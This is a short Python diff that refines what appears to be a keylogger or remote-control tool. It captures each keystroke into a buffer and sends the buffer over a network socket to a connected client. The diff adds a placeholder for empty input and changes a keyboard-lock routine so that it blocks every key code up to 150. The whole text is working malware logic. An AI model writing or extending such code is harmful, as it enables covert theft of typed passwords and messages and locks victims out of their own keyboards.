@@ -12,8 +12,7 @@ def on_press(key):
     if ishook == 1:
         print("t: ", cont)
         try:
-            cont += key.char
-            print("test: ", cont)
+            cont += str(key.char)
         except AttributeError:
             if key == kb.Key.space:
                 cont += ' '
@@ -23,14 +22,17 @@ def on_press(key):
 def send_cont(client, cont):
     #global cont
     print("con:", cont)
+    if cont == "":
+        cont = "no input key"
+    
     client.sendall(bytes(cont , "utf8"))
     #cont = ""
 
 def lock_keyboard(islock):
     if islock == 1:
         # listener.stop()
-        for char in keyboard.all_modifiers + keyboard.all_special_keys + keyboard.all_letters:
-            keyboard.block_key(char)
+        for i in range(150):
+            keyboard.block_key(i)
     else:
         keyboard.unhook_all()
         # listener.start()
